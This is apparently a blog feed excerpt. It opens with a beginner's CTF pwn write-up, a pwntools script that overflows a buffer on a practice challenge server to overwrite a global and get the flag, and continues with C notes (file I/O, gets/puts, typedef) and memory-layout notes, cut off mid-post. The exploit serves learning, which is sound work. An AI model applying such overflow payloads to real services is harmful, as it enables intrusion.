        <content type="html"><![CDATA[<h1 id="我的第一道pwn题"><a href="#我的第一道pwn题" class="headerlink" title="我的第一道pwn题"></a>我的第一道pwn题</h1><p>（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ）</p><p>（而且还是对着writeup做的QAQ）</p><span id="more"></span><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8a1cb1fa1a28c6c5dd193259f683e769c97516e7.png"></p><p>攻防世界原链接：<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5052&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5052&amp;page=1</a></p><h2 id="渣渣自己写的wp"><a href="#渣渣自己写的wp" class="headerlink" title="渣渣自己写的wp"></a>渣渣自己写的wp</h2><p>先用file命令查看查看附件的位数（64or32）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">file asd    <span class="token comment">//ELF附件的名字叫asd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/18/Dn29nP.png"></p><p>可以看到是64位程序，使用64位的IDA打开</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/f70c3615aba90b4884ace2cd6cd0079d29c33303.png"></p><p>这里可以看到程序里有一个read函数，一个if判断，且当if为真时调用sub_400686函数</p><p>进入sub_400686函数查看具体内容：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bbfc53a150c24563a41bcd6305e2bd93c3263541.png"></p><p>即调用 cat flag.txt</p><p>故为了获得flag，我们需要时main函数中的if条件为真，即</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">dword_60106C <span class="token operator">==</span> <span class="token number">1853186401</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而read函数会把输入的值赋值给unk，而我们需要改变dword的值，故需要利用栈溢出原理</p><p>这里查看unk和dword的具体地址</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4aa515d74692eadb5d124b8c2223f0e9a675178a.png"></p><p>即发现unk到dword之间偏移量为4，构造exp：</p><p>（随后具体介绍exp是个啥）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>                    <span class="token operator">//</span>调用pwntoolsr<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">40702</span><span class="token punctuation">)</span>     <span class="token operator">//</span>连接题目服务器，remote<span class="token punctuation">(</span><span class="token string">'ip地址'</span>，端口<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>     <span class="token operator">//</span>构造输入的值，具体下文介绍       r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof"</span><span class="token punctuation">)</span>  <span class="token operator">//</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>：接收到第一次出现<span class="token builtin">str</span>的内容为止r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>                  <span class="token operator">//</span>发送之前构造的payload    <span class="token keyword">print</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>                       <span class="token operator">//</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>：接受收到的所有字符<span class="token keyword">print</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行exp</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a795084c872b178bdc9f1a8af75fcb8b1f5f49b1.png"></p><p>得到flag！！</p><h2 id="关于payload"><a href="#关于payload" class="headerlink" title="关于payload"></a>关于payload</h2><p>上文的payload具体为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于unk和dword之间的<strong>偏移量为4</strong>，故填充4个‘a’，然后在填充数字1853186401，由于程序是64位的，故将数字进行p64()打包</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言文件读写</title>
      <link href="//post/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99.html"/>
      <url>//post/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习笔记1-7"><a href="#C语言学习笔记1-7" class="headerlink" title="C语言学习笔记1.7"></a>C语言学习笔记1.7</h1><p>使用c语言可以创建，打开，读写文本文件或二进制文件。一个文件，无论它是文本文件还是二进制文件，都是代表了一系列的字节。</p><p> 语言不仅提供了访问顶层的函数，也提供了底层（OS）调用来处理存储设备上的文件。</p><span id="more"></span><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>可以使用 <strong>fopen( )</strong> 函数来创建一个新的文件或者打开一个已有的文件，这个调用会初始化类型 <strong>FILE</strong> 的一个对象，类型 <strong>FILE</strong> 包含了所有用来控制流的必要的信息。下面是这个函数调用的原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">FILE <span class="token operator">*</span><span class="token function">fopen</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> filename<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> mode <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里，<strong>filename</strong> 是字符串，用来命名文件，访问模式 <strong>mode</strong> 的值可以是下列值中的一个：</p><p><strong>访问模式</strong></p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>r</td><td>打开一个<strong>已有的</strong>文本文件，<strong>只允许</strong>读取文件，文件必须存在，否则打开失败。</td></tr><tr><td>w</td><td>打开一个文本文件，若不存在则创建一个新文件，程序会从<strong>文件开头</strong>开始写入，若已存在内容，则清空文件内容，重新写入</td></tr><tr><td>a</td><td>打开一个文本文件，若不存在则创建一个新文件，程序以<strong>追加形式的继续写入</strong>。</td></tr><tr><td>r+</td><td>打开一个<strong>已有的</strong>文本文件，<strong>读写</strong>文件内容，文件必须存在，否则打开失败。</td></tr><tr><td>w+</td><td>以<strong>写入/更新</strong>方式打开文件，相当于<code>w</code>和<code>r+</code>叠加的效果。既可以读取也可以写入，也就是随意更新文件。如果文件不存在，那么创建一个新文件；如果文件存在，那么清空文件内容（相当于删除原文件，再创建一个新文件）。</td></tr><tr><td>a+</td><td>以<strong>追加/更新</strong>方式打开文件，相当于<code>a</code>和<code>r+</code>叠加的效果。既可以读取也可以写入，也就是随意更新文件。如果文件不存在，那么创建一个新文件；如果文件存在，那么将写入的数据追加到文件的末尾（文件原有的内容保留）。</td></tr></tbody></table><p><strong>读写权限</strong></p><table><thead><tr><th>权限</th><th>说明</th></tr></thead><tbody><tr><td>t</td><td>文本文件，不写默认为“t”</td></tr><tr><td>b</td><td>二进制文件</td></tr></tbody></table><p>调用 fopen() 函数时必须指明读写权限，但是可以不指明读写方式（此时默认为<code>&quot;t&quot;</code>）。</p><p>读写权限和读写方式可以组合使用，但是必须将读写方式放在读写权限的中间或者尾部（<strong>换句话说，不能将读写方式放在读写权限的开头</strong>）。例如：</p><ul><li>将读写方式放在读写权限的末尾：”rb”、”wt”、”ab”、”r+b”、”w+t”、”a+t”</li><li>将读写方式放在读写权限的中间：”rb+”、”wt+”、”ab+”</li></ul><p>整体来说，文件打开方式由 r、w、a、t、b、+ 六个字符拼成，各字符的含义是：</p><ul><li>r(read)：读</li><li>w(write)：写</li><li>a(append)：追加</li><li>t(text)：文本文件</li><li>b(binary)：二进制文件</li><li>+：读和写</li></ul><h3 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h3><p>为了关闭文件，请使用 fclose( ) 函数。函数的原型如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fclose</span><span class="token punctuation">(</span> FILE <span class="token operator">*</span>fp <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> str </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言gets/getchar&amp;puts/putchar</title>
      <link href="//post/c%E8%AF%AD%E8%A8%80gets-getchar-puts-putchar.html"/>
      <url>//post/c%E8%AF%AD%E8%A8%80gets-getchar-puts-putchar.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习笔记1-6"><a href="#C语言学习笔记1-6" class="headerlink" title="C语言学习笔记1.6"></a>C语言学习笔记1.6</h1><h2 id="gets-getchar-amp-puts-putchar"><a href="#gets-getchar-amp-puts-putchar" class="headerlink" title="gets/getchar&amp;puts/putchar"></a>gets/getchar&amp;puts/putchar</h2><p>当我们提到<strong>输入</strong>时，这意味着要向程序填充一些数据。输入可以是以文件的形式或从命令行中进行。C 语言提供了一系列内置的函数来读取给定的输入，并根据需要填充到程序中。</p><p>当我们提到<strong>输出</strong>时，这意味着要在屏幕上、打印机上或任意文件中显示一些数据。C 语言提供了一系列内置的函数来输出数据到计算机屏幕上和保存数据到文本文件或二进制文件中。</p><p>除了printf()和scanf()之外，还可以使用getchar/putchar&amp;gets/puts</p><span id="more"></span><h3 id="getchar和putchar"><a href="#getchar和putchar" class="headerlink" title="getchar和putchar"></a>getchar和putchar</h3><p>getchar和putchar每次输入输出一个字符。</p><p>getchar函数从屏幕读取下一个可用的字符，并把它返回为一个整数。这个函数在同一个时间内只会读取一个单一的字符。</p><p>putchar函数把字符输出到屏幕上，并返回相同的字符。这个函数在同一个时间内只会输出一个单一的字符。</p><h3 id="gets和puts"><a href="#gets和puts" class="headerlink" title="gets和puts"></a>gets和puts</h3><p><strong>char *gets(char *s)</strong> 函数从键盘读取一行到 <strong>s</strong> 所指向的缓冲区，直到一个终止符或 EOF。</p><p><strong>int puts(const char *s)</strong> 函数把字符串 s 和一个尾随的换行符写入到屏幕。</p><p>例如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"Enter a value :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">gets</span><span class="token punctuation">(</span> str <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"\nYou entered: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">puts</span><span class="token punctuation">(</span> str <span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译运行：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">Enter a value <span class="token operator">:</span>mark0519You entered<span class="token operator">:</span> mark0519<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> str </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言typedef</title>
      <link href="//post/C%E8%AF%AD%E8%A8%80typedef.html"/>
      <url>//post/C%E8%AF%AD%E8%A8%80typedef.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习笔记1-5"><a href="#C语言学习笔记1-5" class="headerlink" title="C语言学习笔记1.5"></a>C语言学习笔记1.5</h1><h2 id="Ctypedef"><a href="#Ctypedef" class="headerlink" title="Ctypedef"></a>Ctypedef</h2><p>C 语言提供了 <strong>typedef</strong> 关键字，可以使用它来为类型取一个新的名字。</p><span id="more"></span><p>使用<strong>typedef</strong>关键字，为一个类型取一个新的名字，例如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> LLD<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样定义了一个数据类型LLD,即为long long int 型的缩写，之后就可以这样写:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">LLD a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照惯例，定义时会大写字母，以便提醒用户类型名称是一个象征性的缩写。但小写也是合法的。</p><p>也可以使用 <strong>typedef</strong> 来为用户自定义的数据类型取一个新的名字。例如，可以对结构体使用 typedef 来定义一个新的数据类型名字，然后使用这个新的数据类型来直接定义结构变量，如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">data</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> sex<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>DATA<span class="token punctuation">;</span>DATA mark0519<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这等价于：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">data</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> sex<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>data mark0519<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> str </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编学习笔记——前置2.0.1</title>
      <link href="//post/%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B.html"/>
      <url>//post/%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B.html</url>
      
        <content type="html"><![CDATA[<h1 id="汇编学习笔记——前置2-0-1"><a href="#汇编学习笔记——前置2-0-1" class="headerlink" title="汇编学习笔记——前置2.0.1"></a>汇编学习笔记——前置2.0.1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>汇编语言是二进制指令的文本形式</strong>，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p><p>然而我现在是一个对计算机从底层到顶层都不清楚的小白~，这里将会记录我学习汇编的一路经(kan)历(ke)？所以让我先从一大堆前置知识开始吧QAQ</p><span id="more"></span><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/51345e78ca48661e12aec5a11c15e81fa8e466bb.png" alt="计算机硬件"></p><h2 id="寄存器-amp-存储器"><a href="#寄存器-amp-存储器" class="headerlink" title="寄存器&amp;存储器"></a>寄存器&amp;存储器</h2><p>CPU （中央处理器）本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是cpu的运算速度远高于内存的读写速度，为了避免被拖慢，cpu自带<strong>一级缓存和二级缓存</strong>（早期一级缓集成在cpu中，而二级缓存焊在主板上，现在基本都集成在cpu中）。cpu自带的缓存可以看作读写较快的内存（但造价高，所以容量小），高速缓存是内存的部分拷贝。</p><p>但是，缓存的读写还不够快，而且数据在缓存中的地址是不固定的，cpu的每次读写都要寻址也会拖慢速度，因此，除了缓存之外，CPU 还自带了<strong>寄存器（register）</strong>，用来储存最常用的数据。</p><p>因为寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，所以这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。即CPU 优先读写寄存器，再由寄存器跟内存交换数据。</p><p>数据访问过程 ： <strong>CPU &lt;— &gt; 寄存器&lt;— &gt; 缓存&lt;— &gt;内存</strong></p><p>访问速度金字塔：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/6a6a3a4379cd184e7a0dddea4d6042d6104af6e1.png"></p><h3 id="寄存器-amp-存储器的工作过程"><a href="#寄存器-amp-存储器的工作过程" class="headerlink" title="寄存器&amp;存储器的工作过程"></a>寄存器&amp;存储器的工作过程</h3><h4 id="寄存器的工作过程"><a href="#寄存器的工作过程" class="headerlink" title="寄存器的工作过程"></a>寄存器的工作过程</h4><p>（1）找到相关的寄存器；</p><p>（2）读取这些位。</p><h4 id="内存的工作过程"><a href="#内存的工作过程" class="headerlink" title="内存的工作过程"></a>内存的工作过程</h4><p>（1）找到数据的指针。（指针可能存放在寄存器内，所以这一步就已经包括寄存器的全部工作了。）</p><p>（2）将指针送往内存管理单元（MMU），由MMU将虚拟的内存地址翻译成实际的物理地址。</p><p>（3）将物理地址送往内存控制器（memory controller），由内存控制器找出该地址在哪一根内存插槽（bank）上。</p><p>（4）确定数据在哪一个内存块（chunk）上，从该块读取数据。</p><p>（5）数据先送回内存控制器，再送回CPU，然后开始使用。</p><p>内存的工作流程比寄存器多出许多步。每一步都会产生延迟，累积起来就使得内存比寄存器慢得多。</p><h3 id="寄存器支持数量"><a href="#寄存器支持数量" class="headerlink" title="寄存器支持数量"></a>寄存器支持数量</h3><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/63f6bb103b7f782f7333e5b7774c5c0006ee733c.png" alt="来自维基百科"></p><h3 id="部分寄存器的种类和作用"><a href="#部分寄存器的种类和作用" class="headerlink" title="部分寄存器的种类和作用"></a>部分寄存器的种类和作用</h3><p>（1）ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</p><p>（2）EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧（即最新push进的栈帧）的底部。</p><p>（3）EIP：EIP寄存器里存储的是CPU下次要执行的指令的地址。</p><blockquote><p> 详解见后面的章节</p></blockquote><h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><p>寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。</p><p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址，结束地址是较大的那个地址。</p><p>习惯上，将高位地址表示在上面，地位地址表示在下面。</p><h3 id="程序内存总览"><a href="#程序内存总览" class="headerlink" title="程序内存总览"></a>程序内存总览</h3><p>C语言映像中内存的空间布局情况：在《C专 家编程》中或者《Unix环境高级编程》中有关于内存空间布局情况的说明，大致如下表：</p><table><thead><tr><th>（内容）</th><th>（地址）</th></tr></thead><tbody><tr><td><strong>———————–   （最高内存地址）</strong></td><td>0xffffffff</td></tr><tr><td><strong>栈底</strong></td><td>0x……..</td></tr><tr><td><strong>栈</strong>  <strong>（stack）</strong></td><td>0x……..</td></tr><tr><td><strong>栈顶</strong></td><td>0x……..</td></tr><tr><td><strong>———————–</strong></td><td>0x……..</td></tr><tr><td><strong>NULL (空)</strong></td><td>0x……..</td></tr><tr><td><strong>———————–</strong></td><td>0x……..</td></tr><tr><td><strong>堆</strong>  <strong>（heap）</strong></td><td>0x……..</td></tr><tr><td><strong>———————–</strong></td><td>0x……..</td></tr><tr><td><strong>未初始化的数据</strong>    [ BSS段（bss segment）]</td><td>0x……..</td></tr><tr><td><strong>———————–</strong></td><td>0x……..</td></tr><tr><td><strong>初始化的数据</strong>    [ 数据段（data segment） ]</td><td>0x……..</td></tr><tr><td><strong>———————–</strong></td><td>0x……..</td></tr><tr><td><strong>正文段(代码段)</strong>    （code segment/text segment）</td><td>0x……..</td></tr><tr><td><strong>———————–    (最低内存地址)</strong></td><td>0x00000000</td></tr></tbody></table><p>**栈(stack)**：栈又称堆栈， 存放程序的 局部变量（但不包括static声明的变量， static意味着 在数据段中存放变量）。除此以外，在函数被调用时，栈用来传递参数和返回值。由于栈的先进先出特点，所以栈特别方便用来保存/恢复调用现场。</p><p>**堆（heap)**：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc/free等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）/释放的内存从堆中被剔除（堆被缩减）</p><p><strong>代码段（code segment/text segment）</strong>：代码段通常是指用来存放程序执行代码（二进制形式）的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域<strong>通常属于只读</strong>, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些 <strong>只读的常数变量</strong>，例如字符串常量等。</p><p><strong>BSS段（bss segment）</strong>：BSS段通常是指用来存放程序中 <strong>未初始化的 或者初始化成为0 的 全局变量</strong>的一块内存区域。（C语言规定未显式初始化的全局变量值默认为0）BSS是英文Block Started by Symbol的简称。BSS段属于静态内存分配。</p><p><strong>数据段（data segment）</strong>：数据段通常是指用来存放程序中<strong>已初始化的 全局变量</strong>的一块内存区域。数据段属于静态内存分配。</p><h4 id="内存空间分布图："><a href="#内存空间分布图：" class="headerlink" title="内存空间分布图："></a>内存空间分布图：</h4><p>APUE中的一个典型C内存空间分布图：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2065d5f2319c7d318016d35bfa36c1f9c43f01ab.png" alt="APUE中的一个典型C内存空间分布图"></p><p> Linux32位用户空间分布图：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/990aba25849cb54defc249a0dc56d19a08118910.png" alt="别人那截的图QAQ"></p><h4 id="一个非常经典的例子"><a href="#一个非常经典的例子" class="headerlink" title="一个非常经典的例子"></a>一个非常经典的例子</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//main.cpp</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">//全局初始化区  数据段</span><span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>     <span class="token comment">//全局未初始化区 BSS段</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> b<span class="token punctuation">;</span>            <span class="token comment">//栈</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span> <span class="token comment">//栈</span><span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>         <span class="token comment">//栈</span><span class="token keyword">char</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token punctuation">;</span>  <span class="token comment">//"123456\0"在常量区（代码段），p3在栈上。</span><span class="token keyword">static</span> <span class="token keyword">int</span> c<span class="token operator">=</span><span class="token number">0</span>；      <span class="token comment">//全局（静态）初始化区 数据段</span>        p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ------------↓-------------</span>p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//分配得来得10和20字节的区域就在堆区,但注意p1和p2仍在栈区。</span><span class="token function">strcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//"123456\0"放在常量区（代码段），编译器可能会将它与p3所指向的"123456\0"优化成一个地方。</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他东西好复杂，，让我们先研究堆和栈。。。</p><h3 id="堆-Heap-amp-amp-栈-Stack"><a href="#堆-Heap-amp-amp-栈-Stack" class="headerlink" title="堆(Heap) &amp;&amp; 栈(Stack)"></a>堆(Heap) &amp;&amp; 栈(Stack)</h3><h4 id="堆（Heap）"><a href="#堆（Heap）" class="headerlink" title="堆（Heap）"></a>堆（Heap）</h4><h5 id="生成过程"><a href="#生成过程" class="headerlink" title="生成过程"></a>生成过程</h5><p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址，结束地址是较大的那个地址。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/19a4184a9ac24e9409371ef5e93c2202d040f398.png"></p><p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用<code>malloc</code>命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址<code>0x1000</code>开始给他分配，一直分配到地址<code>0x100A</code>，如果再要求得到22个字节，那么就分配到<code>0x1020</code>。</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/76e9218e830a3693d7c3809475a3e7da473a16aa.png"></p><p>这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放（free函数），或者由垃圾回收机制来回收。</p><h5 id="最最最最最最基础应用介绍"><a href="#最最最最最最基础应用介绍" class="headerlink" title="最最最最最最基础应用介绍"></a>最最最最最最基础应用介绍</h5><p>在C语言中，申请堆区使用 C 标准库 &lt;stdlib.h&gt;中的**malloc()**函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>释放堆区使用 **free()**函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="栈-Stack"><a href="#栈-Stack" class="headerlink" 